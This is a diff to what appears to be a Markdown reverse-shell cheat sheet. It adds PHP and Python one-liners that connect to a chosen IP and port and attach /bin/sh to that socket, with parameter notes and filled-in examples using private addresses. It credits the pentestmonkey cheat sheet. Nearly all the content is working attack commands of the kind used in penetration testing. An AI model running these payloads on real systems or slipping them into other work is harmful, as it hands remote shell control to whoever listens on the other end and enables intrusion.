@@ -103,14 +103,32 @@ Older versions of nc don't have the nice `-e` option, so it has to be done sligh
 
 ## PHP
 
+### Simple Shell
 
+    php -r '$sock=fsockopen("[IP]",[Port]);exec("/bin/sh -i <&3 >&3 2>&3");'
+    
+#### Params
+
+    [IP]: The IP address to connect back to with a shell
+    [Port]: The port to connect to
+
+#### Examples
+
+    php -r '$sock=fsockopen("192.168.54.98",8888);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 ## Python
 
+### Standard Reverse Shell
 
+    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IP]",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
-## Perl
+#### Params
 
+    [IP]: The IP address to connect back to with a shell
+    [Port]: The port to connect to
 
+#### Examples
+
+    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.101",2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
 *Note: Some shells here were sourced or modified from http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet*
